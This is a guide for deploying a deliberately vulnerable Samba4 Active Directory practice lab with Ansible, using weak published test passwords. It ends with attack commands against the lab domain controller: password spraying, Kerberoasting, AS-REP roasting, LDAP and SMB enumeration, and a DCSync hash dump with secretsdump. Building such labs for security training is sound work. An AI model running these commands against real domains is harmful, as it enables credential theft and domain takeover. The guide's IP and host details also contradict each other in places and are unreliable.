# Samba4 Active Directory Ansible Automated Deployment Guide

## Overview

This document describes how to use Ansible to automate the deployment of a Samba4 Active Directory lab environment, including one domain controller (DC) and multiple domain member servers.

## Environment Architecture

```
                    ┌─────────────────┐
                    │   victim1 (DC)  │
                    │   10.0.1.4      │
                    │ Samba AD DC     │
                    └────────┬────────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
┌────────┴────────┐ ┌────────┴────────┐ ┌────────┴────────┐
│    victim2      │ │   redirector    │ │  emailServer    │
│   10.0.1.5      │ │   10.0.1.2      │ │   10.0.1.3      │
│  Domain Member  │ │  Domain Member  │ │  Domain Member  │
└─────────────────┘ └─────────────────┘ └─────────────────┘
```

### Domain Configuration

| Parameter | Value |
|-----------|-------|
| Domain (Realm) | `YOURCOMPANY.LOCAL` |
| NetBIOS Name | `YOURCOMPANY` |
| Domain Admin Password | `P@ssw0rd123!` |
| DC IP Address | `10.0.1.4` |

---

## Project Structure

```
samba-ad/
├── ansible.cfg              # Ansible configuration file
├── inventory.ini            # Host inventory
├── site.yml                 # Main playbook
├── run-setup.sh             # One-click deployment script
├── verify-setup.sh          # Environment verification script
├── MANUAL_SETUP.md          # Manual configuration reference
├── ANSIBLE_DEPLOYMENT.md    # This document
└── roles/
    ├── samba_dc/            # Domain controller role
    │   └── tasks/
    │       └── main.yml
    └── samba_member/        # Domain member role
        ├── tasks/
        │   └── main.yml
        └── templates/
            ├── krb5.conf.j2
            └── smb.conf.member.j2
```


## Prerequisites

### 1. Control Machine (Running Ansible)

```bash
# Install Ansible
pip install ansible

# Verify installation
ansible --version
```

### 2. Target Hosts

- Ubuntu 20.04/22.04 LTS (recommended)
- SSH key authentication configured
- User with sudo privileges
- Network connectivity (internal 10.0.1.x subnet)



## Configuration Files

### inventory.ini - Host Inventory

```ini
# Domain Controller
[dc]
victimDC ansible_host=victimDC

# Domain Members
[domain_members]
victim1 ansible_host=victim1
victim2 ansible_host=victim2
victim3 ansible_host=victim3
victim4 ansible_host=victim4
victim5 ansible_host=victim5

# Global Variables
[samba_ad:vars]
ansible_user=lexuswang                    # SSH username
ansible_python_interpreter=/usr/bin/python3
domain_name=YOURCOMPANY.LOCAL             # Domain name
domain_netbios=YOURCOMPANY                # NetBIOS name
domain_admin_password=P@ssw0rd123!        # Domain admin password
dc_ip=10.0.2.1                            # DC IP address
```

**Customization**:

To modify the domain name or other parameters, edit the `[samba_ad:vars]` section in `inventory.ini`.

### ansible.cfg - Ansible Configuration

```ini
[defaults]
inventory = inventory.ini
roles_path = roles
host_key_checking = False      # Don't verify host key on first connection
timeout = 30

[privilege_escalation]
become = True
become_method = sudo
become_ask_pass = True         # Ask for sudo password at runtime

[ssh_connection]
pipelining = True              # Improve execution efficiency
```

---

## Test Connectivity

```bash
cd samba-ad/
ansible all -m ping --ask-become-pass
```

Expected output:
```
victimDC | SUCCESS => {"ping": "pong"}
victim2 | SUCCESS => {"ping": "pong"}
...
```

---

## Deployment Steps

### Method 1: Using One-Click Deployment Script (Recommended)

```bash
cd samba-ad/

# Deploy complete environment (DC + all domain members)
./run-setup.sh all

# Or deploy in stages
./run-setup.sh dc        # Deploy domain controller only
./run-setup.sh members   # Deploy domain members only

# Check host connectivity
./run-setup.sh check
```

### Method 2: Direct Ansible Playbook Usage

```bash
cd samba-ad/

# Deploy complete environment
ansible-playbook site.yml --ask-become-pass

# Deploy domain controller only
ansible-playbook site.yml --tags dc --ask-become-pass

# Deploy domain members only
ansible-playbook site.yml --tags members --ask-become-pass

# Verbose output mode
ansible-playbook site.yml --ask-become-pass -v

# Check mode (dry run without execution)
ansible-playbook site.yml --ask-become-pass --check
```

### Method 3: Target Specific Hosts

```bash
# Deploy to victim2 only
ansible-playbook site.yml --limit victim2 --ask-become-pass

# Deploy to multiple specific hosts
ansible-playbook site.yml --limit "victim2,redirector" --ask-become-pass
```

---

## Deployment Process Details

### Stage 1: Domain Controller Configuration (samba_dc role)

1. **Install Packages**
   - samba, smbclient, krb5-user, winbind, ldb-tools, python3-samba, etc.

2. **Stop Conflicting Services**
   - Stop and mask smbd, nmbd, winbind
   - Disable systemd-resolved (free port 53)

3. **Configure Samba AD Domain**
   ```bash
   samba-tool domain provision \
       --server-role=dc \
       --use-rfc2307 \
       --dns-backend=SAMBA_INTERNAL \
       --realm=YOURCOMPANY.LOCAL \
       --domain=YOURCOMPANY \
       --adminpass='P@ssw0rd123!'
   ```

4. **Configure Kerberos and DNS**
   - Copy `/var/lib/samba/private/krb5.conf` to `/etc/krb5.conf`
   - Configure `/etc/resolv.conf` to point to localhost

5. **Start samba-ad-dc Service**

6. **Create Test Users**
   - jsmith, mwilson (regular users)
   - admin.backup (Domain Admins member)
   - svc_sql (service account with SPN)

### Stage 2: Domain Member Configuration (samba_member role)

1. **Install Packages**
   - samba, smbclient, krb5-user, winbind, etc.

2. **Configure DNS**
   - Disable systemd-resolved
   - Configure `/etc/resolv.conf` to point to DC (10.0.1.4)

3. **Configure Kerberos** (using krb5.conf.j2 template)

4. **Configure Samba** (using smb.conf.member.j2 template)

5. **Join Domain**
   ```bash
   net ads join -U Administrator%'P@ssw0rd123!'
   ```

6. **Configure NSS and PAM**
   - Enable winbind user/group resolution
   - Configure automatic home directory creation

7. **Start Services**
   - smbd, nmbd, winbind

---

## Verify Deployment

### Using Verification Script

```bash
./verify-setup.sh
```

### Manual Verification Commands

#### On Domain Controller (victim1):

```bash
# Check domain level
sudo samba-tool domain level show

# List domain computers
sudo samba-tool computer list

# List domain users
sudo samba-tool user list

# Test DNS
host -t A victim1.yourcompany.local localhost

# Test Kerberos
kinit Administrator
# Enter password: P@ssw0rd123!
klist
```

#### On Domain Members:

```bash
# Test domain join status
net ads testjoin

# Test winbind connection
wbinfo -t

# List domain users
wbinfo -u

# List domain groups
wbinfo -g

# Test user resolution
getent passwd jsmith

# Test domain user login
su - jsmith
# Password: Summer2024!

# Test Kerberos authentication
kinit jsmith@YOURCOMPANY.LOCAL
klist

# Test SMB access
smbclient -L //victim1 -k
```

---

## Test User List

| Username | Password | Role | Purpose |
|----------|----------|------|---------|
| Administrator | P@ssw0rd123! | Domain Admin | Domain administrator |
| admin.backup | Backup@dmin1 | Domain Admin | Backup administrator |
| jsmith | Summer2024! | Domain User | Regular user |
| mwilson | Welcome123! | Domain User | Regular user |
| svc_sql | SqlService1! | Domain User | SQL service account (has SPN, Kerberoastable) |

---

## Penetration Testing Scenarios

This environment supports the following attack exercises:

### 1. Password Spraying

```bash
# Using crackmapexec
crackmapexec smb 10.0.1.4 -u users.txt -p 'Summer2024!' --continue-on-success
```

### 2. Kerberoasting

```bash
# svc_sql account has SPN, can obtain TGS and crack offline
GetUserSPNs.py YOURCOMPANY.LOCAL/jsmith:'Summer2024!' -dc-ip 10.0.1.4 -request
```

### 3. AS-REP Roasting

```bash
# Find users without pre-authentication required
GetNPUsers.py YOURCOMPANY.LOCAL/ -usersfile users.txt -dc-ip 10.0.1.4
```

### 4. LDAP Enumeration

```bash
# Anonymous LDAP query
ldapsearch -x -H ldap://10.0.1.4 -b "DC=yourcompany,DC=local" "(objectClass=user)" cn

# Authenticated LDAP query
ldapsearch -x -H ldap://10.0.1.4 -D "jsmith@yourcompany.local" -w 'Summer2024!' \
    -b "DC=yourcompany,DC=local" "(objectClass=user)" cn sAMAccountName
```

### 5. SMB Enumeration

```bash
# List shares
smbclient -L //10.0.1.4 -U jsmith%'Summer2024!'

# Enumerate users
enum4linux -U 10.0.1.4
```

### 6. DCSync (Requires Domain Admin)

```bash
# Extract all password hashes using Domain Admin credentials
secretsdump.py YOURCOMPANY/Administrator:'P@ssw0rd123!'@10.0.1.4
```

---

## Troubleshooting

### Issue 1: Ansible Connection Failed

```bash
# Check SSH connection
ssh victim1 "hostname"

# Check Python interpreter
ansible all -m raw -a "which python3"

# Use verbose mode
ansible all -m ping -vvv
```

### Issue 2: Domain Configuration Failed

```bash
# Check Samba AD service status
sudo systemctl status samba-ad-dc

# View Samba logs
sudo tail -f /var/log/samba/log.samba

# Reconfigure (use with caution, will delete existing configuration)
sudo systemctl stop samba-ad-dc
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
# Then re-run playbook
```

### Issue 3: Domain Member Cannot Join

```bash
# Check DNS resolution
nslookup victim1.yourcompany.local 10.0.1.4

# Check time synchronization (Kerberos requires time difference < 5 minutes)
date
ntpdate -q victim1

# Check network connectivity
ping 10.0.1.4
telnet 10.0.1.4 389  # LDAP
telnet 10.0.1.4 88   # Kerberos
```

### Issue 4: Winbind Not Working

```bash
# Check service status
sudo systemctl status winbind

# Restart related services
sudo systemctl restart smbd nmbd winbind

# View winbind logs
sudo tail -f /var/log/samba/log.winbindd

# Rejoin domain
sudo net ads leave -U Administrator%'P@ssw0rd123!'
sudo net ads join -U Administrator%'P@ssw0rd123!'
sudo systemctl restart smbd nmbd winbind
```

### Issue 5: DNS Port Occupied

```bash
# Check port 53 usage
sudo ss -tlnp | grep :53

# If occupied by systemd-resolved
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved
```

---

## Reset Environment

### Reset Domain Member

```bash
# Execute on domain member
sudo net ads leave -U Administrator%'P@ssw0rd123!'
sudo systemctl stop smbd nmbd winbind
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
```

### Reset Domain Controller

```bash
# Execute on DC
sudo systemctl stop samba-ad-dc
sudo rm -rf /var/lib/samba/*
sudo rm /etc/samba/smb.conf
```

### Redeploy

```bash
./run-setup.sh all
```

---

## Extended Configuration

### Add New Domain Member

1. Add new host in `inventory.ini`:
   ```ini
   [domain_members]
   victim2 ansible_host=victim2
   new_host ansible_host=new_host_ip
   ```

2. Run playbook:
   ```bash
   ansible-playbook site.yml --limit new_host --tags members --ask-become-pass
   ```

### Add New User

```bash
# Execute on DC
sudo samba-tool user create username 'Password123!' \
    --given-name="First" --surname="Last" \
    --mail-address="username@yourcompany.local"
```

### Add to Domain Admins

```bash
sudo samba-tool group addmembers "Domain Admins" username
```

### Set SPN (For Kerberoasting Demo)

```bash
sudo samba-tool spn add HTTP/webserver.yourcompany.local:80 username
```

---

## Reference Documentation

- [Samba AD DC HOWTO](https://wiki.samba.org/index.php/Setting_up_Samba_as_an_Active_Directory_Domain_Controller)
- [Samba Domain Member](https://wiki.samba.org/index.php/Setting_up_Samba_as_a_Domain_Member)
- [Ansible Documentation](https://docs.ansible.com/)

---

## Appendix: Complete Variable Reference

| Variable Name | Default Value | Description |
|---------------|---------------|-------------|
| `domain_name` | YOURCOMPANY.LOCAL | Kerberos Realm |
| `domain_netbios` | YOURCOMPANY | NetBIOS domain name |
| `domain_admin_password` | P@ssw0rd123! | Domain administrator password |
| `dc_ip` | 10.0.1.4 | Domain controller IP |
| `ansible_user` | lexuswang | SSH connection user |